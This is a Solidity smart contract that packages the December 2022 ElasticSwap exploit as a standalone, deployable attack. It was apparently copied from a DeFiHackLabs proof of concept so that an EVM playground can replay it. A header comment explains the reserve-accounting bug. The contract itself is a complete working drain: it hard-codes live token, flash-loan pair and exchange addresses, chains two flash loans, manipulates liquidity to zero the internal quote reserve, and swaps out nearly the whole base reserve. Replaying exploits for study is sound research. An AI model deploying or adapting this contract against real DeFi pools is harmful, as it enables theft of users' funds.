// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-12-ElasticSwap).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (ContractTest): the two flash-swap callbacks (uniswapV2Call + joeCall) live on
// the test itself, so there is no standalone contract to deploy. This contract is
// a faithful, self-contained copy of that inline attack (testExploit +
// uniswapV2Call + joeCall) so the playground can deploy it and record run().
// Logic and constants are copied verbatim from test/ElasticSwap_exp.sol.
//
// Root cause: ElasticSwap's Exchange prices swaps off BOTH the live ERC-20
// balance and an internal `InternalBalances` ledger. removeLiquidity silently
// clamps the internal quote reserve to 0 when the real quote balance has been
// inflated above it, after which swapQuoteTokenForBaseToken's "quote-decay"
// branch derives an `impliedQuoteTokenQty ≈ 0` and returns essentially the
// ENTIRE base reserve for a handful of wei. The decay state is fully attacker-
// manufactured from the public addLiquidity/removeLiquidity/transfer surface —
// no rebase token required.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IELPExchange is IERC20 {
    struct InternalBalances {
        uint256 baseTokenReserveQty; // x
        uint256 quoteTokenReserveQty; // y
        uint256 kLast;
    }

    function internalBalances() external view returns (InternalBalances memory);
    function addLiquidity(
        uint256 _baseTokenQtyDesired,
        uint256 _quoteTokenQtyDesired,
        uint256 _baseTokenQtyMin,
        uint256 _quoteTokenQtyMin,
        address _liquidityTokenRecipient,
        uint256 _expirationTimestamp
    ) external;
    function removeLiquidity(
        uint256 _liquidityTokenQty,
        uint256 _baseTokenQtyMin,
        uint256 _quoteTokenQtyMin,
        address _tokenRecipient,
        uint256 _expirationTimestamp
    ) external;
    function swapQuoteTokenForBaseToken(
        uint256 _quoteTokenQty,
        uint256 _minBaseTokenQty,
        uint256 _expirationTimestamp
    ) external;
}

contract ElasticSwapDrain {
    IERC20 constant TIC = IERC20(0x75739a693459f33B1FBcC02099eea3eBCF150cBe);
    IERC20 constant USDC_E = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);
    IUniswapV2Pair constant SPair = IUniswapV2Pair(0x4CF9dC05c715812FeAD782DC98de0168029e05C8);
    IUniswapV2Pair constant JPair = IUniswapV2Pair(0xA389f9430876455C36478DeEa9769B7Ca4E3DDB1);
    IELPExchange constant ELP = IELPExchange(0x4ae1Da57f2d6b2E9a23d07e264Aa2B3bBCaeD19A);

    // Mirrors testExploit(): approve everything to the Exchange, then kick off the
    // nested flash (TIC flash → inside its callback, USDC.e flash → inside THAT
    // callback, the manipulation + swap). Both loans are repaid inside the tx.
    function run() external {
        TIC.approve(address(ELP), type(uint256).max);
        USDC_E.approve(address(ELP), type(uint256).max);
        ELP.approve(address(ELP), type(uint256).max);
        SPair.swap(51_112 * 1e18, 0, address(this), new bytes(1));
    }

    // TIC flash callback (UniswapV2-style). Borrows the USDC.e flash, then repays
    // the TIC flash once the inner callback returns.
    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        JPair.swap(766_685 * 1e6, 0, address(this), new bytes(1));
        TIC.transfer(address(SPair), 51_624 * 1e18);
    }

    // USDC.e flash callback (Trader Joe-style). This is where the actual exploit
    // happens: manufacture the decay state, drain the base side for ~free, cycle
    // the reserves a second time to convert remaining USDC.e to TIC, then repay.
    function joeCall(address, uint256, uint256, bytes calldata) external {
        uint256 TICAmount = TIC.balanceOf(address(ELP));
        uint256 USDC_EAmount = USDC_E.balanceOf(address(ELP));
        uint256 _expirationTimestamp = 1_000_000_000_000;
        ELP.addLiquidity(1e9, 0, 0, 0, address(this), _expirationTimestamp);
        ELP.addLiquidity(TICAmount, USDC_EAmount, 0, 0, address(this), _expirationTimestamp);
        USDC_E.transfer(address(ELP), USDC_E.balanceOf(address(ELP)));
        ELP.removeLiquidity(ELP.balanceOf(address(this)), 1, 1, address(this), _expirationTimestamp);
        // USDC.E swap to TIC — the bug: internal quote reserve is ~0 ⇒ drain base.
        IELPExchange.InternalBalances memory InternalBalance = ELP.internalBalances();
        uint256 USDC_EReserve = InternalBalance.quoteTokenReserveQty;
        ELP.swapQuoteTokenForBaseToken(USDC_EReserve * 100, 1, _expirationTimestamp);
        TICAmount = TIC.balanceOf(address(this));
        USDC_EAmount = USDC_E.balanceOf(address(this));
        // TIC swap to USDC.e — cycle the manipulated reserves the other way.
        ELP.addLiquidity(TICAmount, USDC_EAmount, 0, 0, address(this), _expirationTimestamp);
        ELP.removeLiquidity(ELP.balanceOf(address(this)), 1, 1, address(this), _expirationTimestamp);
        USDC_E.transfer(address(JPair), 774_353 * 1e6);
    }
}
